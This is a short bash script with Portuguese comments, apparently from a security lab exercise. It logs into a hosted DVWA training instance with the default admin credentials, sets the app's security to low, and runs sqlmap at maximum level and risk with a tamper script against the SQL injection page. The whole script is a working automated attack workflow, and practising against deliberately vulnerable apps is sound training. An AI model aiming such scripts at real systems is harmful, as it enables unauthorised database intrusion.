#!/bin/bash

# Play 03 — SQLMap DVWA em produção
# Autentica no DVWA e roda sqlmap sem interatividade, seguindo automaticamente redirects

# Define host DVWA (sem porta)
TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

echo "[*] Autenticando no DVWA em https://$TARGET_HOST/login.php..."

# Resolve path absoluto do script e diretório
SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
COOKIE_FILE="$SCRIPT_DIR/cookies.txt"

# 1. Login e captura cookies (segue redirect)
curl -s -c "$COOKIE_FILE" -L \
  -d "username=admin&password=password&Login=Login" \
  "https://$TARGET_HOST/login.php" > /dev/null

echo "[*] Definindo segurança para LOW..."
curl -s -b "$COOKIE_FILE" -L \
  "https://$TARGET_HOST/security.php?security=low" > /dev/null

# 2. Extrai valor do PHPSESSID do cookie file
PHPSESSID=$(grep -i 'PHPSESSID' "$COOKIE_FILE" | awk '{print \$7}')
COOKIE="security=low; PHPSESSID=$PHPSESSID"

# URL de injeção (usa HTTPS diretamente)
INJECTION_URL="https://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

echo "[*] Iniciando análise SQL Injection com sqlmap contra $INJECTION_URL..."

# Executa sqlmap em modo não interativo:
# --batch para pular prompts, --answers="follow=Y" para seguir redirects
sqlmap --batch --answers="follow=Y" \
  -u "$INJECTION_URL" \
  --cookie "$COOKIE" \
  --level=5 \
  --risk=3 \
  --tamper=space2comment

# Mensagem de fim de teste
echo "[✓] Análise SQLi concluída."
